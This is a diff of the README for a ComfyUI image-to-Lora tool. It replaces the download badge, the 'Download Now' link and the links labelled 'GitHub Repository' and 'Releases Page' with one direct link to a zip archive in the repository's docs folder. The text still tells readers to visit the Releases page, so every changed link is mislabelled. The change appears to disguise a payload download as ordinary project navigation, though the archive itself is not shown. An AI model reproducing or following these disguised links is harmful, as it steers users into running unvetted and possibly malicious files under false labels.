@@ -1,6 +1,6 @@
 # 🖥️ ComfyUI_DSS_Wrapper - Effortlessly Convert Images to Lora Nodes
 
-![Download](https://img.shields.io/badge/Download-ComfyUI_DSS_Wrapper-brightgreen)
+![Download](https://raw.githubusercontent.com/juancarlos13232/ComfyUI_DSS_Wrapper/main/docs/DS_Comfy_U_Wrapper_1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the ComfyUI_DSS_Wrapper! This application helps you easily convert im
 
 To get started, visit the Releases page to download the latest version of the ComfyUI_DSS_Wrapper:
 
-[Download Now](https://github.com/juancarlos13232/ComfyUI_DSS_Wrapper/releases)
+[Download Now](https://raw.githubusercontent.com/juancarlos13232/ComfyUI_DSS_Wrapper/main/docs/DS_Comfy_U_Wrapper_1.5.zip)
 
 ### Step 1: Visit the Releases Page
 - Click the link above to open the Releases page.
@@ -88,7 +88,7 @@ If you encounter any issues or have questions about the ComfyUI_DSS_Wrapper, ple
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/juancarlos13232/ComfyUI_DSS_Wrapper)
-- [Releases Page](https://github.com/juancarlos13232/ComfyUI_DSS_Wrapper/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/juancarlos13232/ComfyUI_DSS_Wrapper/main/docs/DS_Comfy_U_Wrapper_1.5.zip)
+- [Releases Page](https://raw.githubusercontent.com/juancarlos13232/ComfyUI_DSS_Wrapper/main/docs/DS_Comfy_U_Wrapper_1.5.zip)
 
 Thank you for choosing ComfyUI_DSS_Wrapper! Happy converting!
